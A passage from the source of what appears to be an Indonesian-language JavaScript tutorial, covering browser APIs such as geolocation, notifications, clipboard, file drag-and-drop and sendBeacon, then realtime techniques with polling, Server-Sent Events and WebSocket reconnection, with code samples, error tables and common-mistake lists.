                reject(new Error(pesan ?? 'Gagal mengambil lokasi.'));
              },
              { enableHighAccuracy: false, timeout: 10_000, maximumAge: 60_000 },
            );
          });
        }
        `,
      ),
      p(
        'Fungsi ini membungkus API berbasis callback menjadi Promise, memakai pola `new Promise` dari Bab 3, karena `getCurrentPosition` memang lahir sebelum Promise ada. Bagian yang paling berguna dipelajari adalah penerjemahan `err.code`. Angka `1`, `2`, dan `3` masing-masing berarti izin ditolak, posisi tidak bisa ditentukan, dan waktu habis, dan ketiganya butuh **tanggapan yang berbeda** dari aplikasimu, sehingga menyeragamkannya jadi satu pesan membuang informasi yang sudah tersedia. Objek pemetaan yang langsung diikuti `[err.code]` adalah alternatif ringkas untuk `switch`, seperti dibahas di sub-bab percabangan. Tiga opsi di akhir juga menentukan pengalaman. `enableHighAccuracy: false` memakai jaringan alih-alih GPS sehingga jauh lebih hemat baterai dan cepat, `timeout` mencegah menunggu selamanya, dan `maximumAge: 60_000` mengizinkan memakai posisi yang diperoleh kurang dari semenit lalu, cukup akurat untuk kebanyakan kebutuhan dan menghindari pengukuran ulang.',
      ),
      callout(
        'tip',
        'Minta izin saat pengguna paham kenapa',
        'Meminta lokasi begitu halaman terbuka hampir selalu ditolak — dan penolakan itu **permanen** sampai pengguna mengubahnya di pengaturan browser. Minta saat ia menekan "Cari yang terdekat", bukan sebelumnya.',
      ),

      h2('Notification'),
      code(
        'js',
        `
        async function beriTahu(judul, isi) {
          if (!('Notification' in window)) return;

          if (Notification.permission === 'denied') return;   // hormati penolakan

          if (Notification.permission === 'default') {
            const hasil = await Notification.requestPermission();
            if (hasil !== 'granted') return;
          }

          new Notification(judul, { body: isi });
        }
        `,
      ),
      p(
        "Empat baris penjagaan sebelum notifikasi benar-benar dibuat, dan masing-masing menangani keadaan yang berbeda. `!('Notification' in window)` menutup perangkat yang tidak mendukungnya sama sekali. Pemeriksaan `'denied'` adalah yang paling penting secara etis, karena begitu pengguna menolak, **menanyakannya lagi tidak akan memunculkan dialog apa pun**. Browser mengingat penolakan itu, jadi memaksa hanya menghasilkan kode yang berjalan sia-sia. Keadaan `'default'` berarti belum pernah ditanya, dan hanya di situlah `requestPermission()` layak dipanggil. Perhatikan urutannya, di mana izin diminta **di dalam** fungsi yang memang hendak mengirim notifikasi dan bukan saat halaman dimuat, sebab itulah yang membuat pengguna melihat dialognya pada saat ia sudah paham kenapa izin itu dibutuhkan.",
      ),

      h2('File API'),
      code(
        'js',
        `
        // Membaca isi berkas tanpa mengunggahnya
        const teks = await file.text();
        const buffer = await file.arrayBuffer();

        // Drag and drop
        zona.addEventListener('dragover', (e) => e.preventDefault());   // WAJIB
        zona.addEventListener('drop', (e) => {
          e.preventDefault();
          for (const file of e.dataTransfer.files) proses(file);
        });
        `,
      ),
      p(
        'Dua baris pertama membaca isi berkas **tanpa mengunggahnya ke mana pun** — semuanya terjadi di komputer pengguna, sehingga bisa dipakai untuk memvalidasi isi CSV atau menampilkan pratinjau sebelum permintaan jaringan pertama. `text()` untuk berkas teks, `arrayBuffer()` untuk data biner. Bagian drag-and-drop di bawahnya memuat satu keanehan yang menjebak hampir semua orang: `preventDefault()` pada `dragover` ditandai **WAJIB**, dan tanpa itu peristiwa `drop` tidak pernah terpicu sama sekali. Alasannya, perilaku bawaan browser untuk berkas yang diseret ke halaman adalah **membukanya sebagai halaman baru**, dan menahan perilaku itu adalah cara memberi tahu browser bahwa area ini bersedia menerima jatuhan. Berkas yang dijatuhkan tiba di `e.dataTransfer.files`, berbentuk koleksi yang sama persis dengan `input.files` dari sub-bab unggah.',
      ),

      h2('Memeriksa izin lebih dulu'),
      code(
        'js',
        `
        const status = await navigator.permissions.query({ name: 'geolocation' });
        status.state;   // 'granted' | 'denied' | 'prompt'

        status.addEventListener('change', () => perbaruiTampilan(status.state));
        `,
      ),
      p(
        'Keunggulan Permissions API adalah ia menjawab **tanpa memunculkan dialog apa pun**, sehingga kamu bisa mengetahui keadaannya lebih dulu dan menyesuaikan antarmuka sebelum meminta. Tiga nilainya masing-masing menuntun ke tindakan berbeda. `granted` berarti langsung pakai. `prompt` berarti belum pernah ditanya, jadi tampilkan tombol yang menjelaskan kenapa izinnya dibutuhkan. Dan `denied` berarti dialog **tidak akan pernah muncul lagi**, sehingga yang tepat bukan mencoba meminta ulang melainkan menyediakan jalur alternatif, misalnya membiarkan pengguna mengetik kotanya sendiri. Listener `change` di baris terakhir melengkapi gambarannya. Pengguna bisa mengubah izin lewat pengaturan browser kapan saja tanpa memuat ulang halaman, dan tanpa listener itu antarmukamu akan terus menampilkan keadaan yang sudah usang.',
      ),

      h2('Pola yang berlaku untuk semuanya'),
      ol(
        '**Periksa keberadaannya** — `if (!navigator.clipboard) return;`',
        '**Minta izin saat relevan**, bukan saat halaman dimuat.',
        '**Tangani penolakan** dengan jalur alternatif, bukan dengan pesan buntu.',
        '**Jangan pernah menganggapnya berhasil** — semuanya bisa gagal di perangkat sungguhan.',
      ),

      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Halaman pelacakan kurir harus menampilkan posisi terkini di peta, mengingat posisi terakhir saat sinyal hilang, dan tetap mengirim catatan waktu tiba walaupun aplikasi ditutup tepat setelah tombol ditekan. Ketiganya butuh API peramban yang berbeda, dan ketiganya punya jebakan yang sama, yaitu bekerja di komputer pengembang dan gagal di lapangan.',
      ),
      code(
        'js',
        `
        // 1. Geolocation: selalu asinkron, selalu butuh izin, sering gagal.
        function ambilPosisi({ batasMs = 10_000 } = {}) {
          return new Promise((teruskan, tolak) => {
            if (!('geolocation' in navigator)) {
              tolak(new Error('Peramban ini tidak menyediakan lokasi'));
              return;
            }
            navigator.geolocation.getCurrentPosition(
              (pos) => teruskan({
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                akurasiMeter: pos.coords.accuracy,
                padaMs: pos.timestamp,
              }),
              (galat) => tolak(terjemahkanGalatLokasi(galat)),
              { enableHighAccuracy: true, timeout: batasMs, maximumAge: 30_000 },
            );
          });
        }

        function terjemahkanGalatLokasi(galat) {
          if (galat.code === 1) return new Error('Izin lokasi ditolak');
          if (galat.code === 2) return new Error('Posisi tidak bisa ditentukan');
          if (galat.code === 3) return new Error('Waktu habis mencari posisi');
          return new Error('Gagal mengambil lokasi');
        }
        `,
        { filename: 'src/kurir/lokasi.js' },
      ),
      p(
        'Tiga kode galat itu menuntut tanggapan yang berbeda, dan menggabungkannya menjadi satu pesan adalah kesalahan yang sering. Kode 1 berarti pengguna menolak, dan meminta lagi tidak akan memunculkan dialog karena peramban mengingat penolakannya. Yang bisa dilakukan hanya menjelaskan cara mengaktifkannya lewat pengaturan situs. Kode 3 berarti waktunya habis, dan itu wajar di dalam gedung, sehingga tombol coba lagi memang berguna.',
      ),
      p(
        'Opsi `maximumAge: 30_000` sering dilewatkan padahal ia sangat menolong. Ia memperbolehkan peramban mengembalikan posisi yang sudah diketahui asalkan belum lebih dari tiga puluh detik, sehingga jawabannya seketika dan tidak menyalakan GPS lagi. Untuk pelacakan yang tidak menuntut ketelitian per detik, ini menghemat baterai secara nyata.',
      ),
      code(
        'js',
        `
        // 2. Halaman ditutup: fetch biasa akan dibatalkan, sendBeacon tidak.
        function catatKedatangan(data) {
          const isi = new Blob([JSON.stringify(data)], { type: 'application/json' });

          // Dikirim di latar, dan tetap terkirim walaupun tab ditutup.
          if (navigator.sendBeacon?.('/api/kedatangan', isi)) return;

          // Cadangan untuk peramban yang tidak menyediakannya.
          fetch('/api/kedatangan', {
            method: 'POST',
            body: isi,
            keepalive: true,          // sama maksudnya, dengan batas sekitar 64 KB
          }).catch(() => {});
        }

        // Pakai visibilitychange, BUKAN unload.
        document.addEventListener('visibilitychange', () => {
          if (document.visibilityState === 'hidden') catatKedatangan(kumpulkan());
        });
        `,
        { filename: 'src/kurir/catat.js' },
      ),
      p(
        'Pemilihan `visibilitychange` alih-alih `unload` bukan selera. Peristiwa `unload` tidak pernah dipicu di sebagian besar peramban seluler saat pengguna berpindah aplikasi, sehingga kodemu tidak pernah berjalan justru pada perangkat tempat ia paling dibutuhkan. `visibilitychange` dengan keadaan `hidden` dipicu pada keduanya, yaitu tab ditutup maupun aplikasi dipindah ke latar.',
      ),
      p(
        '`sendBeacon` mengembalikan boolean yang menyatakan apakah permintaannya berhasil **diantrekan**, bukan apakah ia berhasil sampai. Kamu tidak akan pernah tahu hasilnya, dan itu memang sifatnya. Ia untuk data yang boleh hilang sesekali seperti analitik, bukan untuk hal yang harus dipastikan tersimpan. Untuk yang harus dipastikan, simpan dulu ke penyimpanan lalu kirim saat halaman dibuka lagi.',
      ),
      code(
        'js',
        `
        // 3. Menyalin ke papan klip butuh gerakan pengguna, dan bisa ditolak.
        async function salinNomorResi(nomor, tombol) {
          try {
            await navigator.clipboard.writeText(nomor);
            tombol.textContent = 'Tersalin';
          } catch (galat) {
            // Gagal kalau bukan dari klik, bukan HTTPS, atau izin ditolak.
            tombol.textContent = 'Salin manual';
            pilihTeks(elemenNomor);      // sorot teksnya supaya bisa disalin sendiri
          } finally {
            setTimeout(() => { tombol.textContent = 'Salin'; }, 2000);
          }
        }
        `,
        { filename: 'src/kurir/salin.js' },
      ),
      p(
        'Sebagian besar API peramban modern hanya tersedia pada konteks yang dianggap aman, yaitu HTTPS dan `localhost`. Menguji lewat alamat IP jaringan lokal seperti `http://192.168.1.5:3000` membuat papan klip, lokasi, kamera, dan `crypto.randomUUID` semuanya tidak tersedia. Ini penyebab laporan bug yang membingungkan, yaitu fitur bekerja di laptop pengembang dan mati saat diuji di ponsel lewat jaringan lokal.',
      ),
      callout(
        'warning',
        'Selalu sediakan jalan keluar saat API tidak tersedia',
        'Setiap API di sub-bab ini bisa tidak ada, bisa ditolak izinnya, dan bisa gagal. Pola yang benar selalu sama, yaitu periksa keberadaannya, bungkus dengan `try`, dan sediakan cara manual. Tombol salin yang gagal harus menyorot teksnya supaya pengguna bisa menyalin sendiri, bukan sekadar diam.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'API peramban punya pola kegagalan yang khas, yaitu sebagian besarnya berkaitan dengan izin dan dengan konteks yang tidak aman.',
      ),
      code(
        'text',
        `
        await navigator.clipboard.writeText('INV-004');

        NotAllowedError: Failed to execute 'writeText' on 'Clipboard':
        Write permission denied.
        `,
        { caption: 'Dipanggil bukan dari gerakan pengguna langsung.' },
      ),
      p(
        'Papan klip hanya bisa ditulis dari dalam penangan peristiwa yang dipicu pengguna, misalnya klik. Penyebab yang sering luput adalah `await` sebelum pemanggilannya. Kalau kamu menulis `await ambilData()` lebih dulu lalu menyalin, gerakan penggunanya sudah dianggap kedaluwarsa. Ambil datanya lebih dulu, atau salin lebih dulu lalu kerjakan sisanya.',
      ),
      code(
        'text',
        `
        navigator.geolocation.getCurrentPosition(ok, gagal);

        GeolocationPositionError { code: 1, message: "User denied Geolocation" }
        `,
        { caption: 'Pengguna menolak, dan penolakannya diingat peramban.' },
      ),
      p(
        'Setelah kode 1 muncul, memanggilnya lagi tidak akan memunculkan dialog izin. Peramban langsung menolak tanpa bertanya. Karena itu meminta izin berkali-kali sia-sia dan justru membuat pengguna terganggu. Yang benar adalah menjelaskan kenapa lokasinya dibutuhkan **sebelum** memintanya, lalu kalau ditolak, tunjukkan cara mengubahnya lewat ikon gembok di bilah alamat.',
      ),
      code(
        'text',
        `
        const id = crypto.randomUUID();

        TypeError: crypto.randomUUID is not a function
        `,
        { caption: 'Halaman dibuka lewat HTTP di alamat selain `localhost`.' },
      ),
      p(
        'Sudah muncul di Bab 2 dan diulang di sini karena ia mewakili seluruh kelompok API yang butuh konteks aman. Yang termasuk di dalamnya antara lain papan klip, lokasi, kamera, mikrofon, notifikasi, dan `SubtleCrypto`. Kalau beberapa fitur mati bersamaan saat diuji lewat alamat IP, hampir pasti inilah penyebabnya, bukan bug di masing-masing fiturnya.',
      ),
      code(
        'text',
        `
        window.addEventListener('unload', () => {
          fetch('/api/analitik', { method: 'POST', body: data });
        });

        # Di ponsel: tidak pernah terkirim, dan tidak ada error apa pun.
        `,
        { caption: 'Peristiwa `unload` tidak dipicu di sebagian besar peramban seluler.' },
      ),
      p(
        'Peramban seluler biasanya membekukan halaman saat pengguna berpindah aplikasi, lalu membuangnya nanti tanpa pernah memicu `unload`. Selain itu, `fetch` biasa yang dimulai saat halaman ditutup akan dibatalkan sebelum sempat terkirim. Gabungan keduanya berarti data analitikmu hilang justru pada perangkat yang paling banyak dipakai. Ganti dengan `visibilitychange` dan `sendBeacon`.',
      ),
      table(
        ['Pesan atau gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            '`NotAllowedError` pada papan klip',
            'Tidak dipanggil dari gerakan pengguna, atau ada `await` sebelumnya',
            'Panggil langsung di dalam penangan klik, sebelum `await` apa pun',
          ],
          [
            '`GeolocationPositionError code 1`',
            'Pengguna menolak, dan penolakannya diingat',
            'Jelaskan alasannya sebelum meminta, dan tunjukkan cara mengubah izinnya',
          ],
          [
            '`crypto.randomUUID is not a function`',
            'Halaman tidak berada di konteks aman',
            'Uji lewat `localhost` atau pasang sertifikat pengembangan',
          ],
          [
            'Data terakhir tidak pernah terkirim di ponsel',
            '`unload` tidak dipicu, dan `fetch` biasa dibatalkan',
            'Pakai `visibilitychange` dengan `sendBeacon` atau `keepalive`',
          ],
          [
            'Lokasi selalu kehabisan waktu di dalam gedung',
            'GPS tidak dapat sinyal, dan `enableHighAccuracy` memperlamanya',
            'Turunkan ketelitian, dan naikkan `maximumAge` supaya posisi lama boleh dipakai',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'API peramban mudah dipakai di contoh dan sulit dipakai dengan benar di lapangan, sebab hampir semuanya bergantung pada izin, konteks, dan perangkat.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Meminta izin lokasi atau notifikasi saat halaman baru dibuka',
            'Sekalian, supaya sudah siap saat dibutuhkan',
            'Pengguna yang belum tahu kenapa hampir selalu menolak, dan penolakannya permanen. Minta tepat saat fiturnya dipakai',
          ],
          [
            'Menganggap API yang ada di dokumentasi pasti tersedia',
            'Dokumentasinya kan resmi',
            "Ketersediaan berbeda antar-peramban dan antar-versi. Periksa keberadaannya dengan `if ('x' in navigator)` sebelum memakainya",
          ],
          [
            'Menguji fitur berizin lewat alamat IP jaringan lokal',
            'Supaya bisa dicoba di ponsel',
            'Bukan konteks aman, sehingga sebagian besar API berizin tidak tersedia. Pakai terowongan HTTPS atau sertifikat lokal',
          ],
          [
            'Memakai `unload` untuk mengirim data terakhir',
            'Itu peristiwa saat halaman ditutup',
            'Tidak dipicu di ponsel, dan `fetch` di dalamnya dibatalkan. Pakai `visibilitychange` dan `sendBeacon`',
          ],
          [
            'Tidak menyediakan cara manual saat API gagal',
            'API-nya kan biasanya bekerja',
            'Pengguna yang izinnya ditolak tidak punya jalan keluar sama sekali. Tombol salin harus menyorot teks, dan lokasi harus bisa diisi manual',
          ],
          [
            'Memakai `enableHighAccuracy: true` untuk semua kasus',
            'Lebih teliti pasti lebih baik',
            'Ia menyalakan GPS yang boros baterai dan lambat di dalam gedung. Pakai hanya kalau ketelitian meter memang dibutuhkan',
          ],
        ],
      ),
      p(
        'Baris pertama layak dijadikan aturan tetap karena akibatnya tidak bisa dibatalkan. Dialog izin hanya muncul sekali, dan penolakan pengguna diingat peramban sampai ia sendiri mengubahnya lewat pengaturan yang jarang orang tahu. Meminta izin di detik pertama, sebelum pengguna paham apa yang ditawarkan aplikasimu, berarti membakar satu-satunya kesempatan yang kamu punya.',
      ),
      callout(
        'tip',
        'Pola meminta izin yang tingkat penerimaannya jauh lebih tinggi',
        'Tampilkan penjelasan versimu sendiri lebih dulu, misalnya kotak kecil bertuliskan alasan lokasi dibutuhkan beserta tombol Izinkan dan Nanti. Dialog izin sungguhan baru dipanggil kalau pengguna menekan Izinkan. Kalau ia menekan Nanti, kamu belum kehilangan apa-apa dan bisa bertanya lagi lain kali.',
      ),
      divider,
      h2('Rangkuman'),
      ul(
        'Clipboard butuh secure context dan pemicu dari tindakan pengguna.',
        'Izin yang ditolak bersifat permanen sampai pengguna mengubahnya sendiri.',
        'Minta izin saat pengguna sudah paham kenapa ia dibutuhkan.',
        '`dragover` wajib di-`preventDefault` agar `drop` terpicu.',
        'Semua API ini bisa gagal — sediakan jalur alternatif.',
      ),
      references(
        {
          label: 'Secure contexts',
          href: 'https://developer.mozilla.org/en-US/docs/Web/Security/Secure_Contexts',
          source: 'MDN',
          note: 'Daftar API yang mensyaratkannya, beserta alasan `localhost` ikut dianggap aman.',
        },
        {
          label: 'Permissions API',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Permissions_API',
          source: 'MDN',
          note: 'Memeriksa keadaan izin tanpa memicu dialog — `granted`, `denied`, atau `prompt`.',
        },
        {
          label: 'Clipboard API',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Clipboard_API',
          source: 'MDN',
          note: 'Termasuk syarat secure context dan pemicu dari tindakan langsung pengguna.',
        },
        {
          label: 'Geolocation API',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Geolocation_API',
          source: 'MDN',
          note: 'Ketiga jalur kegagalan yang wajib ditangani: ditolak, tidak tersedia, dan habis waktu.',
        },
        {
          label: 'Notification permissions best practices',
          href: 'https://web.dev/articles/push-notifications-permissions-ux',
          source: 'web.dev',
          note: 'Alasan meminta izin saat halaman dibuka hampir selalu berakhir dengan penolakan permanen.',
        },
      ),
    ],
  ),

  written(
    'realtime',
    'Realtime: WebSocket & Server-Sent Events',
    22,
    'Ketika server perlu mengirim lebih dulu, tanpa diminta.',
    [
      p(
        'HTTP biasa selalu dimulai klien. Untuk notifikasi, chat, atau angka yang berubah sendiri, server yang perlu memulai — dan ada tiga tingkat solusi.',
      ),

      terms(
        {
          term: 'realtime',
          meaning:
            'Terjemahannya **waktu nyata**. Keadaan ketika pembaruan sampai ke pengguna **segera setelah terjadi**, bukan menunggu ia menyegarkan halaman. Perlu diluruskan: "realtime" di web hampir tidak pernah berarti seketika secara harfiah — yang dimaksud adalah cukup cepat sehingga terasa langsung.',
        },
        {
          term: 'polling',
          meaning:
            'Terjemahannya **menanyai berulang**. Klien bertanya ke server setiap sekian detik, entah ada perubahan atau tidak. Terdengar primitif, tapi **sering justru jawaban yang benar**: jauh lebih sedikit yang bisa rusak, lewat proxy dan firewall mana pun, dan tidak butuh infrastruktur khusus.',
        },
        {
          term: 'long polling',
          meaning:
            'Varian di mana server **menahan permintaan** sampai ada kabar baru, baru kemudian menjawab. Mengurangi permintaan sia-sia dibanding polling biasa, dengan harga koneksi yang menggantung lebih lama.',
        },
        {
          term: 'SSE',
          meaning:
            'Singkatan *Server-Sent Events*, terjemahannya **peristiwa yang dikirim server**. Aliran **satu arah** dari server ke klien lewat HTTP biasa. Dua keunggulan praktisnya sering diremehkan: ia **menyambung ulang otomatis** saat koneksi putus, dan karena tetap HTTP biasa, ia melewati proxy tanpa masalah.',
        },
        {
          term: 'EventSource',
          meaning:
            'Objek browser untuk membuka koneksi SSE: `new EventSource("/api/aliran")`. Penyambungan ulang sudah tertanam di dalamnya — kamu tidak perlu menulis logika apa pun untuk itu.',
        },
        {
          term: 'WebSocket',
          meaning:
            'Protokol **dua arah** yang membuka saluran tetap antara klien dan server, sehingga keduanya bisa mengirim kapan saja. Harganya nyata: protokolnya sendiri (bukan HTTP), penyambungan ulang **harus kamu tulis sendiri**, dan sebagian proxy perusahaan memblokirnya.',
        },
        {
          term: 'handshake',
          meaning:
            'Terjemahannya **jabat tangan**. Proses pembuka koneksi WebSocket, yang justru dimulai sebagai permintaan HTTP biasa berisi permintaan naik tingkat (`Upgrade: websocket`). Setelah server menyetujuinya, koneksi yang sama beralih ke protokol WebSocket.',
        },
        {
          term: 'wss://',
          meaning:
            'Skema alamat WebSocket **terenkripsi**, padanan `https://`. Selalu pakai ini di produksi — `ws://` mengirim seluruh pesan dalam bentuk terbaca, dan banyak browser menolaknya dari halaman HTTPS.',
        },
        {
          term: 'heartbeat',
          meaning:
            'Terjemahannya **denyut jantung**. Pesan kecil yang dikirim berkala untuk **memastikan koneksi masih hidup**. Dibutuhkan karena koneksi yang mati diam-diam, misalnya diputus perantara jaringan, sering tidak memicu peristiwa `close` sama sekali.',
        },
        {
          term: 'backpressure',
          meaning:
            'Terjemahannya **tekanan balik**. Keadaan ketika pesan datang lebih cepat daripada kemampuan penerima mengolahnya. Pada aliran realtime yang ramai, ini menumpuk di memori dan akhirnya membuat tab berat — sehingga pembatasan laju perlu dipikirkan sejak awal.',
        },
      ),

      h2('Tiga pendekatan'),
      table(
        ['', 'Polling', 'SSE', 'WebSocket'],
        [
          ['Arah', 'Klien bertanya', 'Server → klien', '**Dua arah**'],
          ['Protokol', 'HTTP biasa', 'HTTP biasa', 'Protokol sendiri'],
          ['Sambung ulang otomatis', 'Tidak perlu', '**Ya, bawaan**', 'Harus ditulis sendiri'],
          ['Melewati proxy/firewall', 'Selalu', 'Biasanya', 'Kadang bermasalah'],
          ['Kerumitan', 'Paling rendah', 'Rendah', 'Tinggi'],
        ],
      ),
      callout(
        'tip',
        'Mulai dari yang paling sederhana',
        'Kalau pembaruan setiap 30 detik sudah cukup, polling biasa adalah jawaban yang benar — dan jauh lebih sedikit yang bisa rusak. Naik ke SSE kalau butuh lebih cepat dan arahnya satu; naik ke WebSocket hanya kalau klien juga perlu mengirim terus-menerus.',
      ),

      h2('Server-Sent Events'),
      code(
        'js',
        `
        const sumber = new EventSource('/api/aliran');

        sumber.addEventListener('message', (e) => {
          const data = JSON.parse(e.data);
          tampilkan(data);
        });

        sumber.addEventListener('notifikasi', (e) => {   // event bernama
          beriTahu(JSON.parse(e.data));
        });

        sumber.addEventListener('error', () => {
          // EventSource menyambung ulang SENDIRI — jangan buru-buru menutupnya
          if (sumber.readyState === EventSource.CLOSED) tampilkan('Koneksi terputus.');
        });

        // Wajib saat halaman/komponen ditinggalkan
        sumber.close();
        `,
      ),
      p(
        'Perhatikan tidak ada satu pun kode yang **mengirim** sesuatu di sini, dan itu ciri utama Server-Sent Events. Alirannya **satu arah**, dari server ke klien saja. Untuk notifikasi, pembaruan harga, atau progres pekerjaan panjang, satu arah sudah cukup, dan pembatasan itu yang membuat SSE jauh lebih sederhana daripada WebSocket. Dua listener pertama menunjukkan bahwa server bisa memberi **nama** pada peristiwanya. `message` adalah nama bawaan, sedangkan `notifikasi` hanya terpicu untuk aliran yang secara eksplisit ditandai server dengan nama itu, sehingga satu koneksi bisa membawa beberapa jenis pesan. Bagian `error` memuat hal yang paling sering disalahpahami, yaitu `EventSource` **menyambung ulang sendiri secara otomatis**, jadi error bukan berarti koneksinya berakhir. Memeriksa `readyState === CLOSED` adalah cara membedakan gangguan sesaat dari kegagalan yang sesungguhnya. Baris `close()` tetap wajib karena tanpanya koneksi dan usaha menyambung ulangnya berjalan terus meski halamannya sudah ditinggalkan.',
      ),

      h2('WebSocket'),
      code(
        'js',
        `
        const ws = new WebSocket('wss://contoh.id/soket');

        ws.addEventListener('open', () => ws.send(JSON.stringify({ tipe: 'gabung', ruang: 'a' })));

        ws.addEventListener('message', (e) => {
          const pesan = JSON.parse(e.data);
          tampilkan(pesan);
        });

        ws.addEventListener('close', (e) => {
          console.log('tertutup', e.code, e.wasClean);
        });

        ws.addEventListener('error', () => tampilkan('Koneksi bermasalah.'));

        ws.close(1000, 'selesai');
        `,
      ),
      p(
        'Bedanya dengan SSE terlihat di baris kedua, karena ada `ws.send(...)` sehingga alirannya **dua arah**. Perhatikan pengirimannya diletakkan di dalam listener `open` dan bukan langsung setelah `new WebSocket(...)`, sebab koneksinya belum terbentuk pada baris itu dan mengirim terlalu awal akan melempar error. Data yang lewat selalu berupa **teks atau biner** dan tidak pernah object, sehingga `JSON.stringify` saat mengirim dan `JSON.parse` pada `e.data` saat menerima adalah pasangan yang selalu dibutuhkan. Listener `close` membawa dua keterangan penting. `e.code` adalah kode alasan penutupan, sedangkan `e.wasClean` membedakan penutupan yang tertib dari koneksi yang putus begitu saja, dan pembedaan itu yang menentukan perlu tidaknya menyambung ulang. Angka `1000` pada `ws.close(1000, \'selesai\')` adalah kode baku untuk "selesai secara normal", dan menyebutnya secara eksplisit membantu sisi server membedakan pengguna yang pergi dari jaringan yang putus.',
      ),
      callout(
        'warning',
        'Selalu `wss://`, tidak pernah `ws://`',
        '`ws://` tidak terenkripsi, dan halaman HTTPS akan memblokirnya sebagai mixed content. Sama seperti `https`, ini bukan opsional di produksi.',
      ),

      h2('Menyambung ulang — yang harus kamu tulis sendiri'),
      code(
        'js',
        `
        function sambung(url, { onPesan }) {
          let ws;
          let percobaan = 0;
          let sengajaDitutup = false;

          function buka() {
            ws = new WebSocket(url);

            ws.addEventListener('open', () => { percobaan = 0; });
            ws.addEventListener('message', (e) => onPesan(JSON.parse(e.data)));

            ws.addEventListener('close', () => {
              if (sengajaDitutup) return;

              // Backoff eksponensial + jitter — pola yang sama dengan sub-bab 3.9
              const jeda = Math.min(30_000, 1000 * 2 ** percobaan) * (0.5 + Math.random());
              percobaan++;
              setTimeout(buka, jeda);
            });
          }

          buka();

          return () => { sengajaDitutup = true; ws?.close(1000); };
        }
        `,
      ),
      p(
        'Fungsi `sambung` mengembalikan sebuah fungsi pembersihan — pola yang sama seperti fungsi yang dikembalikan `useEffect` di React. `sengajaDitutup` membedakan dua alasan koneksi tertutup: dipanggil sendiri lewat fungsi pembersihan (tidak perlu menyambung ulang) atau terputus karena sebab lain seperti jaringan (perlu menyambung ulang). `percobaan` di-reset ke `0` setiap kali koneksi berhasil terbuka, sehingga jeda backoff selalu mulai pendek lagi untuk masalah baru, bukan terus memanjang dari kegagalan lama yang sudah pulih.',
      ),

      h2('Yang sering terlupa'),
      ol(
        '**Tutup koneksi** saat halaman atau komponen ditinggalkan — kalau tidak, ia terus hidup.',
        '**Data yang masuk tetap input tidak tepercaya.** Validasi bentuknya, dan jangan pernah merendernya sebagai HTML.',
        '**Autentikasi tetap wajib.** WebSocket tidak otomatis membawa identitas — kirim token saat handshake atau pesan pertama.',
        '**Tangani keadaan terputus di UI.** Pengguna harus tahu kalau angka yang dilihatnya sudah basi.',
      ),

      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Dasbor operasional menampilkan pesanan masuk secara langsung. Versi pertama memanggil server tiap tiga detik untuk menanyakan apakah ada yang baru. Dengan lima puluh operator yang membuka dasbor sepanjang hari, itu berarti seribu permintaan per menit yang sembilan puluh sembilan persennya menjawab tidak ada yang baru. Biaya servernya naik, dan pesanan baru tetap terlambat muncul sampai tiga detik.',
      ),
      p(
        'Ada tiga cara menggantikannya, dan memilih yang tepat bergantung pada satu pertanyaan, yaitu apakah datanya perlu mengalir dua arah.',
      ),
      table(
        ['Cara', 'Arah data', 'Paling cocok untuk'],
        [
          [
            'Polling berkala',
            'Klien bertanya berulang',
            'Data yang jarang berubah, atau saat cara lain tidak tersedia',
          ],
          [
            'Server-Sent Events',
            'Server ke klien saja',
            'Notifikasi, kemajuan pekerjaan, angka yang diperbarui',
          ],
          [
            'WebSocket',
            'Dua arah, terus terbuka',
            'Obrolan, kolaborasi, permainan, kursor bersama',
          ],
        ],
        'Sebagian besar kebutuhan realtime sebenarnya satu arah, dan di situ SSE lebih sederhana.',
      ),
      code(
        'js',
        `
        // Server-Sent Events: satu arah, dan peramban menyambung ulang sendiri.
        function pantauPesanan({ onPesanan, onGalat }) {
          const sumber = new EventSource('/api/aliran-pesanan', { withCredentials: true });

          sumber.addEventListener('pesanan-baru', (peristiwa) => {
            onPesanan(JSON.parse(peristiwa.data));       // data SELALU teks
          });

          sumber.addEventListener('error', () => {
            // readyState memberi tahu apakah ia akan menyambung ulang sendiri.
            if (sumber.readyState === EventSource.CLOSED) onGalat('Koneksi terputus');
            // Kalau CONNECTING, peramban sedang mencoba lagi. Jangan tutup.
          });

          return () => sumber.close();                   // WAJIB dipanggil saat selesai
        }
        `,
        { filename: 'src/dasbor/aliran.js' },
      ),
      p(
        'Keunggulan terbesar `EventSource` adalah penyambungan ulang otomatis yang sudah termasuk di dalamnya. Kalau koneksi putus, peramban menunggu sebentar lalu menyambung lagi tanpa satu baris kode darimu, dan ia bahkan mengirimkan id peristiwa terakhir yang diterima lewat header `Last-Event-ID` sehingga server bisa melanjutkan dari sana. Menulis kemampuan itu sendiri di atas WebSocket memakan puluhan baris.',
      ),
      p(
        'Perhatikan penangan `error` memeriksa `readyState` lebih dulu. Peristiwa `error` pada `EventSource` juga dipicu saat koneksi sedang disambung ulang, dan itu keadaan normal bukan kegagalan. Menampilkan pesan galat setiap kali akan membuat banner berkedip tiap kali jaringan sedikit terganggu. Hanya keadaan `CLOSED` yang berarti ia benar-benar menyerah.',
      ),
      code(
        'js',
        `
        // WebSocket: dua arah, dan seluruh ketahanannya harus kamu tulis sendiri.
        function buatSoket(alamat, { onPesan }) {
          let soket = null;
          let percobaan = 0;
          let hidup = true;

          function sambung() {
            soket = new WebSocket(alamat);

            soket.addEventListener('open', () => { percobaan = 0; });

            soket.addEventListener('message', (peristiwa) => {
              onPesan(JSON.parse(peristiwa.data));       // data SELALU teks atau biner
            });

            soket.addEventListener('close', (peristiwa) => {
              if (!hidup || peristiwa.code === 1000) return;   // 1000 = ditutup normal
              percobaan += 1;
              const jeda = Math.min(30_000, 2 ** percobaan * 500) * (0.5 + Math.random() * 0.5);
              setTimeout(sambung, jeda);                 // backoff + jitter, seperti Bab 3
            });
          }

          sambung();

          return {
            kirim: (data) => {
              if (soket?.readyState !== WebSocket.OPEN) return false;
              soket.send(JSON.stringify(data));
              return true;
            },
            tutup: () => { hidup = false; soket?.close(1000); },
          };
        }
        `,
        { filename: 'src/dasbor/soket.js' },
      ),
